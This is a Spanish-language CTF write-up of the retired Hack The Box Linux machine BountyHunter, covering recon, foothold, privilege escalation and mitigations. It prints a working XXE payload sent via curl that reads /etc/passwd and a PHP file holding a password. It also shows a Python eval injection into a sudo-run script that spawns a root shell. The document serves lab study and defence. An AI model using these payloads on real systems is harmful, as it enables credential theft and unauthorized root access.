---
machine: BountyHunter
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, python, sudo]
---

# BountyHunter — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El formulario de seguimiento de reportes procesa XML sin desactivar entidades externas. Un XXE permite leer archivos del host, incluido el código PHP con la contraseña de `development`; el acceso SSH lleva a un script Python ejecutado con `sudo` que evalúa datos del ticket y permite ejecutar comandos como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Puertos: `22/tcp` SSH y `80/tcp` HTTP.
- Servicios: Apache con una aplicación PHP de gestión de recompensas; SSH para el usuario `development`.
- Tecnologías: PHP, Apache, XML, SQLite/MySQL y un script Python con `sudo`.

## Enumeración

- Vhost `bountyhunter.htb` y formulario `log_submit.php`.
- `tracker_diRbPr00f314.php` recibe un parámetro `data` codificado en base64.
- El código `db.php` y `/etc/passwd` son legibles mediante XXE.
- Usuario del sistema: `development`.

## Foothold

Se envía un XML con una entidad externa que apunta a `file:///etc/passwd` y después a `db.php`. La respuesta del tracker refleja el contenido; la contraseña encontrada se reutiliza por SSH.

```bash
PAYLOAD='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><data>&x;</data></r>'
curl -s http://bountyhunter.htb/tracker_diRbPr00f314.php \
  --data-urlencode "data=$(printf %s "$PAYLOAD" | base64 -w0)"
ssh development@bountyhunter.htb
```

## Movimiento lateral

No hay un segundo host: el movimiento es de la aplicación web al usuario del sistema mediante la contraseña leída en `db.php`.

## Escalada de privilegios

`sudo -l` permite ejecutar `internals.py` como root. El script construye un ticket y lo pasa a `eval`; se inyecta una expresión Python que lanza una shell.

```bash
sudo -l
sudo /usr/bin/python3 /opt/skytrain_inc/internals.py
# En el campo del ticket:
__import__("os").system("/bin/bash")
```

## Evidencia

- Respuesta del tracker con `/etc/passwd` y `db.php`.
- Acceso SSH como `development`.
- `sudo -l` y prompt de root tras la inyección.

## Lecciones aprendidas

- Un parser XML seguro debe desactivar DTD y entidades externas.
- Los secretos en código PHP accesible por el servidor web se filtran con XXE.
- `eval` sobre datos de usuario convierte un script privilegiado en RCE.

## Mitigación y detección

- Deshabilitar entidades externas y DTD en el parser.
- Rotar credenciales y no reutilizar la contraseña de la base con SSH.
- Sustituir `eval` por un parser de datos y ejecutar el script con mínimos privilegios.

## Referencias

- [0xdf — BountyHunter](https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html)
- [IppSec — BountyHunter](https://www.youtube.com/watch?v=5axsDhumfhU)
- [Hack The Box — BountyHunter](https://app.hackthebox.com/machines/bountyhunter)
